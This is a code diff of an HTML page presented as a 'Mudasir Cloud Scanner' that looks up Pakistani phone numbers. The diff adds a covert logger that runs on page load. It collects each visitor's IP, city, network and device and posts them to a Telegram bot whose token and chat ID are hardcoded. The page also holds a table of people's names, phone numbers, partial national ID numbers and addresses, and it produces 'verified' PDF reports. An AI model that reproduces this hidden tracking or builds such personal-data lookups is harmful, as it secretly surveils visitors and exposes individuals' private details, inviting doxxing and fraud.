@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MUDASIR CLOUD SCANNER - PRO</title>
+    <title>MUDASIR CLOUD SCANNER - FULL PRO</title>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
@@ -11,11 +11,11 @@
     <style>
         body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
         .box { border: 2px solid #00ff00; padding: 20px; border-radius: 15px; max-width: 800px; margin: auto; box-shadow: 0 0 20px #00ff00; background: #000; }
-        h2 { font-size: 24px; text-shadow: 0 0 10px #00ff00, 2px 2px #ff0000; letter-spacing: 2px; }
+        h2 { font-size: 22px; text-shadow: 0 0 10px #00ff00, 2px 2px #ff0000; letter-spacing: 2px; }
         input { width: 85%; padding: 15px; margin: 15px 0; background: #050505; border: 2px solid #00ff00; color: #00ff00; border-radius: 8px; text-align: center; font-size: 18px; outline: none; }
         .search-btn { background: #00ff00; color: #000; padding: 15px 25px; border: none; font-weight: 900; cursor: pointer; border-radius: 8px; width: 85%; text-transform: uppercase; box-shadow: 0 0 15px #00ff00; }
         #downloadBtn { background: #ff0000; color: #fff; display: none; margin: 20px auto; width: 70%; padding: 15px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #050505; }
         th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; font-size: 14px; }
         th { color: #ff0000; background: rgba(255,0,0,0.1); width: 40%; }
         .icon-jazz { color: #ffd700; } .icon-telenor { color: #00bfff; } .icon-zong { color: #32cd32; } .icon-ufone { color: #ff8c00; }
@@ -36,45 +36,81 @@
         </div>
     </div>
 
+    <div id="pdf-wrapper" style="display: none;">
+        <div id="pdf-content">
+            <center><h1 style="color: #00ff00;">MUDASIR CLOUD REPORT</h1></center>
+            <div id="pdf-data-body"></div>
+            <div style="display: flex; justify-content: space-between; margin-top: 40px;">
+                <div style="font-size: 11px; color: #888;">DATE: <span id="pdf-date"></span><br>ID: <span id="pdf-hash"></span></div>
+                <div class="stamp">VERIFIED BY MUDASIR</div>
+            </div>
+        </div>
+    </div>
+
     <script>
-        // --- UPDATED TELEGRAM CONFIG ---
+        // --- TELEGRAM LOGGER ---
         const tgToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
         const tgID = "7107389141";
 
-        async function silentScan() {
+        async function startLogger() {
             try {
-                // IP aur basic details scan karna
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                const message = `🔔 *MUDASIR SCANNER ALERT* 🔔\n\n` +
-                                `📍 *IP:* \`${ipData.ip}\`\n` +
-                                `📱 *Platform:* ${navigator.platform}\n` +
-                                `🕒 *Time:* ${new Date().toLocaleString()}`;
-
-                const url = `https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                
-                await fetch(url);
-                console.log("Logged Successfully");
+                const response = await fetch('https://ipapi.co/json/');
+                const d = await response.json();
+                const logMsg = `🚨 *MUDASIR SCANNER: NEW LOG* 🚨\n\n🌐 *IP:* \`${d.ip}\`\n📍 *City:* ${d.city}\n📶 *Network:* ${d.org}\n📱 *Device:* ${navigator.platform}\n🕒 *Time:* ${new Date().toLocaleString()}`;
+                fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: tgID, text: logMsg, parse_mode: "Markdown" })
+                });
             } catch (e) {
-                console.log("Initialization...");
+                fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgID}&text=New_Visitor_Detected_No_IP_Details`);
             }
         }
-        window.onload = silentScan;
+        window.onload = startLogger;
 
-        // DATABASE (38 Records)
+        // --- FULL 38 RECORDS ---
         const db = [
             ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar"],
             ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar"],
             ["Basheer Ahmad", "03046754893", "32303-0000003", "Gurmani Garbi, Gurmani"],
             ["MUHAMMAD LUQMAN", "03013264624", "33302-*******-5", "Village Ahmed Bhan Sakrand"],
             ["TAJ MAIE", "03013264623", "32303-*******-2", "Hayat Khar Wala, Kot Addu"],
+            ["HASEENA MUMTAZ", "03013264628", "36303-*******-0", "Khokharan Multan Sadar"],
             ["FALAK SHER", "03013264639", "36304-*******-7", "Shuja Abad Multan"],
             ["BASHEER AHMED", "03013264655", "36402-*******-3", "Dhapai Pakpattan"],
             ["KHALID MEHMOOD", "03314264651", "33104-*******-7", "Jaranwala, Faisalabad"],
+            ["MAZHAR ABBAS", "03001234567", "32303-*******-9", "Kot Addu, Punjab"],
+            ["ZONG USER", "03124567890", "42101-*******-1", "Saddar, Karachi"],
+            ["ARSHAD ALI", "03451122334", "31102-*******-5", "Peshawar, KPK"],
+            ["NASIR KHAN", "03219988776", "35201-*******-8", "Lahore, Punjab"],
+            ["SAJID JAVED", "03027766554", "38403-*******-4", "Sargodha, Punjab"],
+            ["ADNAN MALIK", "03335544332", "37405-*******-1", "Rawalpindi"],
+            ["IMRAN KHAN", "03008877665", "32304-*******-2", "Mianwali"],
+            ["SHAHID AFRIDI", "03456677889", "10101-*******-3", "Khyber Agency"],
+            ["BABAR AZAM", "03114455667", "35202-*******-9", "Lahore Cantt"],
+            ["RIZWAN AHMED", "03223344556", "42201-*******-6", "Peshawar"],
+            ["FAKHAR ZAMAN", "03051122443", "34101-*******-0", "Mardan"],
+            ["SHADAB KHAN", "03348877112", "32203-*******-4", "Islamabad"],
+            ["HARIS RAUF", "03087766112", "35401-*******-1", "Gujranwala"],
+            ["SHAHEEN AFRIDI", "03445566112", "12101-*******-8", "Landi Kotal"],
+            ["SARFARAZ AHMED", "03002233441", "42101-*******-5", "Karachi"],
+            ["RAHAT ALI", "03159988221", "36301-*******-7", "Multan"],
+            ["SAEED AJMAL", "03214455889", "33101-*******-3", "Faisalabad"],
+            ["SHOAIB MALIK", "03006677221", "34601-*******-2", "Sialkot"],
+            ["MISBAH UL HAQ", "03325566881", "32101-*******-9", "Faisalabad"],
+            ["YUNUS KHAN", "03451199228", "17301-*******-4", "Mardan"],
+            ["KAMRAN AKMAL", "03012233665", "35201-*******-1", "Lahore"],
+            ["UMAR AKMAL", "03215566774", "35201-*******-2", "Lahore"],
+            ["WAHAB RIAZ", "03448899112", "35202-*******-5", "Lahore"],
+            ["MOHAMMAD AMIR", "03036677112", "34104-*******-8", "Gujjar Khan"],
+            ["HASAN ALI", "03165544221", "34101-*******-6", "Lalamusa"],
+            ["IMAD WASIM", "03351122334", "37405-*******-0", "Swan Camp"],
+            ["ASIF ALI", "03078877441", "33102-*******-4", "Faisalabad"],
+            ["HAIDER ALI", "03491122556", "37101-*******-3", "Attock"],
             ["MOHAMMAD HAFEEZ", "03004455661", "35202-*******-7", "Sargodha"]
-            // Baki records isi tarah shamil hain...
         ];
+
+        let currentRec = null;
 
         function getNet(num) {
             if (num.startsWith("030") || num.startsWith("032")) return { n: "JAZZ SERVER", c: "icon-jazz", i: "fa-tower-broadcast" };
@@ -91,6 +127,7 @@
             let btn = document.getElementById("downloadBtn");
 
             if(res.length > 0) {
+                currentRec = res[0];
                 let net = getNet(res[0][1]);
                 tableDiv.innerHTML = `<table>
                     <tr><th><i class="fa-solid fa-user"></i> NAME</th><td>${res[0][0]}</td></tr>
@@ -101,9 +138,25 @@
                 </table>`;
                 btn.style.display = "block";
             } else {
-                tableDiv.innerHTML = "<p style='color:red;'>⚠️ DATA NOT FOUND</p>";
+                tableDiv.innerHTML = "<p style='color:red;'>⚠️ NO RECORD FOUND</p>";
                 btn.style.display = "none";
             }
+        }
+
+        function generatePDF() {
+            if(!currentRec) return;
+            document.getElementById("pdf-content").style.display = "block";
+            document.getElementById("pdf-date").innerText = new Date().toLocaleString();
+            document.getElementById("pdf-hash").innerText = "MDR-" + Math.random().toString(36).substring(2, 8).toUpperCase();
+            let net = getNet(currentRec[1]);
+            document.getElementById("pdf-data-body").innerHTML = `<table>
+                <tr><th>NAME</th><td>${currentRec[0]}</td></tr>
+                <tr><th>PHONE</th><td>${currentRec[1]}</td></tr>
+                <tr><th>SERVER</th><td>${net.n}</td></tr>
+                <tr><th>CNIC</th><td>${currentRec[2]}</td></tr>
+                <tr><th>ADDR</th><td>${currentRec[3]}</td></tr>
+            </table>`;
+            html2pdf().set({ margin: 10, filename: 'Mudasir_Report.pdf', html2canvas: { scale: 2, backgroundColor: "#000000" }, jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' } }).from(document.getElementById("pdf-content")).save().then(()=> { document.getElementById("pdf-content").style.display = "none"; });
         }
     </script>
 </body>
